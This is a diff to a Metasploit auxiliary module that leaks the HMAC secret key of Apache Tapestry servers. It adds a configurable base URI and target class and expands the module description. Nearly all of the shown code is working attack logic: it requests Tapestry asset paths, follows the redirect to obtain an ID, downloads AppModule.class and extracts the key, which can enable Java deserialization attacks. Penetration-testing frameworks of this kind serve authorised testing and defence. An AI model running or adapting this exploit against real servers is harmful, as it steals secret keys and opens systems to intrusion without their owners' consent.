@@ -13,7 +13,11 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Apache Tapestry HMAC secret key leak',
         'Description' => %q{
-          Find the HMAC secret key used in Java serizalization
+          This exploit finds the HMAC secret key used in Java serizalization by Apache Tapestry. This key
+          is located in the file AppModule.class by default and looks like the standard representation of UUID in hex digits (hd) :
+          6hd-4hd-4hd-4hd-12hd
+          If the HMAC key has been changed to look differently, this module won't find the key because it tries to download the file
+          and then uses a specific regex to find the key.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -30,28 +34,30 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(8080),
-      OptString.new('TARGETED_CLASS', [true, 'Name of the targeted java class', 'AppModule.class'])
+      OptString.new('TARGETED_CLASS', [true, 'Name of the targeted java class', 'AppModule.class']),
+      OptString.new('TARGETURI', [true, 'The base path of the Apache Tapestry Server', '/'])
     ])
   end
 
   def check
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => '/assets/app/something/services/AppModule.class/'
+      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/'+datastore['TARGETED_CLASS']+'/')
     })
 
     if res.nil?
       Exploit::CheckCode::Unknown
     elsif res.code == 302
 
-      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/AppModule.class}, 1]
+      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/#{datastore['TARGETED_CLASS']}}, 1]
+      normalized_url = normalize_uri(target_uri.path, '/assets/app/' + id_url + '/services/'+datastore['TARGETED_CLASS']+'/')
       res = send_request_cgi({
         'method' => 'GET',
-        'uri' => '/assets/app/' + id_url + '/services/AppModule.class/'
+        'uri' => normalized_url
       })
 
       if res.code == 200 && res.headers['Content-Type'] == 'application/java'
-        print_good('Java file leak at ' + rhost + ':' + rport.to_s + '/assets/app/' + id_url + '/services/AppModule.class/')
+        print_good('Java file leak at ' + rhost + ':' + rport.to_s + normalized_url)
         Exploit::CheckCode::Vulnerable
       else
         Exploit::CheckCode::Safe
@@ -64,13 +70,14 @@ class MetasploitModule < Msf::Auxiliary
   def run
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => '/assets/app/something/services/AppModule.class/'
+      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/'+datastore['TARGETED_CLASS'] +'/')
     })
 
-    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/AppModule.class}, 1]
+    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/+#{datastore['TARGETED_CLASS']}}, 1]
+    normalized_url = normalize_uri(target_uri.path, '/assets/app/' + id_url + '/services/'+datastore['TARGETED_CLASS']+'/')
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => '/assets/app/' + id_url + '/services/' + datastore['TARGETED_CLASS'] + '/'
+      'uri' => normalized_url
     })
 
     raw_class_file = res.body.to_s
